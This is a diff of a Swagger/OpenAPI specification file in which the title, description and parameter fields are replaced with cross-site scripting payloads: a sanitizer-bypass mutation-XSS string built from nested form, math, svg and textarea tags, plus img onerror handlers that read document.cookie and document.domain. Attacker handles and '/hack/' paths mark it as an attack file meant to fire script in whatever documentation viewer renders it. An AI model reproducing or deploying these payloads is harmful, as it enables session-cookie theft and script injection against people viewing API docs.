@@ -1,8 +1,8 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY SAJJAD
+  title: <img src=x onerror=alert(document.domain)><img src=x onerror=alert(document.cookie)>
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><svg/onload=alert(document.cookie)>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>">"><img src=x onerror=alert(document.domain)><img src=x onerror=alert(document.cookie)><img onerror=alert(1) src=javascript:alert(1);>"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -14,20 +14,20 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /M0X0101:
+  /SYARIF07:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-        - SAJJAD_XSS_D
+        - SYARIF07_XSS_D
       operationId: findAccounts
       summary: Finds all accounts
   '/hack/hachid/{id}':
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><svg/onload=alert(document.cookie)>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(document.domain)><img src=x onerror=alert(document.cookie)><img onerror=alert(1) src=javascript:alert(1);>"></form>
           format: int64
           in: path
           name: id
